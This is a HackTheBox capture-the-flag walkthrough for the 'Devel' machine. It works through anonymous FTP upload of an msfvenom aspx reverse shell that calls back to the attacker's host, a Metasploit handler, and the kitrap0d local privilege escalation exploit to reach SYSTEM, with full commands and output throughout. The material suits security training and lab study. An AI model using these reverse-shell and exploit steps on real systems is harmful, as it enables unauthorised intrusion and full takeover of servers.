HackTheBox Walkthrough : Devel
===

This post is writeup of the HackTheBox machine created by ch4p.

## Nmap
Quick port scan reveals FTP service and web server.

```bash
# nmap -sC -sV 10.10.10.5
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-15 21:00 EDT
Nmap scan report for 10.10.10.5
Host is up (0.28s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.17 seconds
```

## HTTP server
Access to http://10.10.10.5 then displayed IIS 7 default screen.

![](https://i.imgur.com/5y5Ta3b.png)


```bash
# curl 10.10.10.5
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS7</title>
<style type="text/css">
<!--
body {
        color:#000000;
        background-color:#B3B3B3;
        margin:0;
}

#container {
        margin-left:auto;
        margin-right:auto;
        text-align:center;
        }

a img {
        border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>
</div>
</body>
</html>
```

## FTP
Let's check FTP.

```bash
# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:vagrant): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -l
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

I tried to create a web page on the server using FTP.

```bash
# echo "Can we create web page?" > test.html
# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:vagrant): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.html
local: test.html remote: test.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
25 bytes sent in 0.00 secs (469.5012 kB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
10-19-19  12:16PM                   25 test.html
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> quit
221 Goodbye.
```

![](https://i.imgur.com/sMOzfm3.png)

OK, I checked that I can create any page.
Next, Let's upload an .aspx shell for we get the server connection.

## Create / Upload .aspx shell
The following command is that how to create aspx shell with metasploit.

>ASP Meterpreter Reverse TCP
>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp > shell.asp
https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/

```bash
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=8080 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2809 bytes
Saved as: shell.aspx
# ls
shell.aspx  test.html
# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:vagrant): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2845 bytes sent in 0.00 secs (12.8588 MB/s)
ftp> exit
221 Goodbye.
```

## Establish reverse shell connection

Create handler with metasploit

```bash
# msfconsole
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: No database YAML file
[-] ***


                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v5.0.53-dev                          ]
+ -- --=[ 1931 exploits - 1079 auxiliary - 331 post       ]
+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 > use exploit/multi/handler


msf5 exploit(multi/handler) > set lhost 10.10.14.17
lhost => 10.10.14.17
msf5 exploit(multi/handler) > set lport 8080
lport => 8080
```

Access and execute shell.

![](https://i.imgur.com/AlfSIC1.png)

Connection established!

```bash
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.17:8080
[*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.17:8080 -> 10.10.10.5:49160) at 2019-10-15 21:47:33 -0400
```

## Privilege escalation
Check sysinfo

```bash
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
```

Next, check vulnerability on this server.

```bash
meterpreter > background
[*] Backgrounding session 2...
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 2
session => 2
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 29 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

```

Use exploit of `ms10_015_kitrap0d`, it is exploit for local privilege escalation.

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d

msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 2
session => 2
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.17:8080
[*] Launching notepad to host the exploit...
[+] Process 3612 launched.
[*] Reflectively injecting the exploit DLL into 3612...
[*] Injecting exploit into 3612 ...
[*] Exploit injected. Injecting payload into 3612...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (180291 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.17:8080 -> 10.10.10.5:49158) at 2019-10-15 22:18:16 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

OK, I got SYSTEM privilege.
I will check user/SYSTEM flag.

```
meterpreter > shell
Process 4036 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>cd ../../../Users/babis/Desktop
c:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users\babis\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
18/03/2017  02:18 ��                32 user.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  24.428.576.768 bytes free

c:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt

c:\Users\babis\Desktop>cd ../../Adminstrator/Desktop
c:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
```

## Summary
- Let's restrict FTP access
- Don't run externally accessible files
- Get the latest security updates